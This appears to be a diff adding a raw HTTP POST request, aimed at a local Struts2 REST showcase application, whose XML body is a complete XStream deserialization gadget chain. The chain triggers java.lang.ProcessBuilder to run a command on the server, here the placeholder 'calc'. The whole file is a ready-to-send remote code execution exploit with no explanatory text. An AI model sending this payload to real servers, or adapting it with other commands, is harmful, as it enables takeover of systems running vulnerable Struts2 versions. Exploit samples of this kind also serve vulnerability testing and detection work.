@@ -1,0 +1,69 @@
+POST http://127.0.0.1:8080/struts2-rest-showcase/orders HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Content-Length: 1963
+Cache-Control: max-age=0
+Origin: http://127.0.0.1:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
+Content-Type: application/xml
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/new
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: JSESSIONID=1EF0BA9085CFFA2944901297746FE081
+
+<map> 
+	<entry> 
+		<jdk.nashorn.internal.objects.NativeString>
+			<flags>0</flags>
+			<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+				<dataHandler>
+					<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+						<is class="javax.crypto.CipherInputStream">
+							<cipher class="javax.crypto.NullCipher">
+								<initialized>false</initialized>
+								<opmode>0</opmode>
+								<serviceIterator class="javax.imageio.spi.FilterIterator">
+									<iter class="javax.imageio.spi.FilterIterator">
+										<iter class="java.util.Collections$EmptyIterator"/>
+										<next class="java.lang.ProcessBuilder">
+											<command>
+												<string>calc</string>
+											</command>
+											<redirectErrorStream>false</redirectErrorStream>
+										</next>
+									</iter>
+									<filter class="javax.imageio.ImageIO$ContainsFilter">
+										<method>
+											<class>java.lang.ProcessBuilder</class>
+											<name>start</name>
+											<parameter-types/>
+										</method>
+										<name>foo</name>
+									</filter>
+									<next class="string">foo</next>
+								</serviceIterator>
+								<lock/>
+							</cipher>
+							<input class="java.lang.ProcessBuilder$NullInputStream"/>
+							<ibuffer></ibuffer>
+							<done>false</done>
+							<ostart>0</ostart>
+							<ofinish>0</ofinish>
+							<closed>false</closed>
+						</is>
+						<consumed>false</consumed>
+					</dataSource>
+					<transferFlavors/>
+				</dataHandler>
+				<dataLen>0</dataLen>
+			</value>
+		</jdk.nashorn.internal.objects.NativeString>
+		<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+	</entry>
+	<entry>
+		<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+		<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
+	</entry> 
+</map>
